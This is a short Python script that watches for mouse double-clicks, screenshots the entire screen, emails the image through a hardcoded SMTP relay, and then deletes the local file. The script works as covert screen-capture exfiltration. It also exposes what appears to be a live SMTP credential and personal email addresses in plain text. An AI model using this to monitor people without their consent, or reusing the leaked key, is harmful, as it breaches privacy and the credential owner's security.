import pyautogui
from pynput import mouse
from datetime import datetime
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time

def take_screenshot_and_email():
    # Hardcoded email parameters
    smtp_server = 'smtp.mandrillapp.com'
    smtp_user = 'info@maibhisinger.com'
    smtp_pass = 'md-Ph8jEVKFpGWbPflEFWIxWg'
    smtp_port = 587
    to_email = 'jain.sm@gmail.com'
    subject = 'New Screenshot'

    # Ensure the 'screenshots' directory exists
    output_folder = "screenshots"
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Generate a timestamped filename
    filename = os.path.join(output_folder, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")

    # Take a screenshot of the entire screen
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

    print(f"Screenshot saved as '{filename}'")

    # Create and send the email
    msg = MIMEMultipart()
    msg['From'] = smtp_user
    msg['To'] = to_email
    msg['Subject'] = subject

    # Attach the screenshot
    with open(filename, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filename)}')
        msg.attach(part)

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(smtp_user, smtp_pass)
            server.send_message(msg)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

    # Delete the screenshot after sending the email
    try:
        os.remove(filename)
        print(f"Screenshot '{filename}' deleted after email was sent.")
    except Exception as e:
        print(f"Failed to delete screenshot: {e}")

def on_double_click(x, y, button, pressed):
    """
    Callback for mouse events. Sends a screenshot via email on double-click.
    """
    if pressed and button == mouse.Button.left:
        if on_double_click.last_click_time is not None:
            time_since_last_click = time.time() - on_double_click.last_click_time
            if time_since_last_click < 0.3:  # Double-click detected
                take_screenshot_and_email()

        on_double_click.last_click_time = time.time()

# Initialize last click time
on_double_click.last_click_time = None

# Listener for mouse events
print("Listening for double-clicks to capture and email screenshots...")
with mouse.Listener(on_click=on_double_click) as listener:
    listener.join()
